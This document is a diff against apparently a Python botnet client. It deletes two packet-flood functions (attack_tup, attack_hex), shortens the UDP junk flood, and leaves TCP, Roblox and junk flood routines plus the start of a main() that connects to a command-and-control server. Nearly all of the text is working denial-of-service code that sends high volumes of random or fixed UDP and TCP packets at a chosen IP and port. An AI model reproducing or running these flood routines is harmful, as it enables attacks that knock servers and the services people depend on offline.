@@ -1064,32 +1064,7 @@ def attack_tcp(ip, port, secs, size):
                 s.send(random._urandom(size))
         except:
             pass
-
-def attack_tup(ip, port, secs, size):
-    while time.time() < secs:
-        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        dport = random.randint(1, 65535) if port == 0 else port
-        try:
-            data = random._urandom(size)
-            tcp.connect((ip, port))
-            udp.sendto(data, (ip, dport))
-            tcp.send(data)
-        except:
-            pass
-
-def attack_hex(ip, port, secs):
-    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
-    while time.time() < secs:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-
-
+            
 def attack_roblox(ip, port, secs, size):
     while time.time() < secs:
 
@@ -1103,12 +1078,11 @@ def attack_roblox(ip, port, secs, size):
             s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))
 
 def attack_junk(ip, port, secs):
-    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    payload = b"\x00"*69
     while time.time() < secs:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
-        s.sendto(payload, (ip, port))
+        for _ in range(3):
+          s.sendto(payload, (ip, port))
 
 def main():
         c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
